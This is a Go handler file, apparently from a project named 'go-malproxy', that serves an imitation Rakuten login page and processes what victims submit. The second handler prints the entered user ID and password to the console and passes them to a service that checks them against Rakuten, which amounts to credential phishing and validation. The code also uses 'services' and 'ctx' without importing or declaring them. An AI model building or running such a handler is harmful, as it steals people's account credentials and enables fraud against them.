package handler

import (
	"fmt"
	"net/http"

	"github.com/go-malproxy/server/templates"
)

func RakutenLoginHandler(w http.ResponseWriter, r *http.Request) {
	templates.Executor.ExecuteTemplate(w, "rakuten-login", nil)
}

func RakutenHandler(w http.ResponseWriter, r *http.Request) {
	fmt.Println("method  :", r.Method)
	fmt.Println("userid  :", r.FormValue("userid"))
	fmt.Println("password:", r.FormValue("password"))
	userid := r.FormValue("userid")
	password := r.FormValue("password")
	ctxRakuInfo, err := services.CheckingTheIntegrityOfRakutenInformation(ctx, userid, password)
	if err != nil {
		templates.Executor.ExecuteTemplate(w, "err", nil)
	}
	ctx = ctxRakuInfo
	templates.Executor.ExecuteTemplate(w, "autogen_rakuten_info", nil)
}
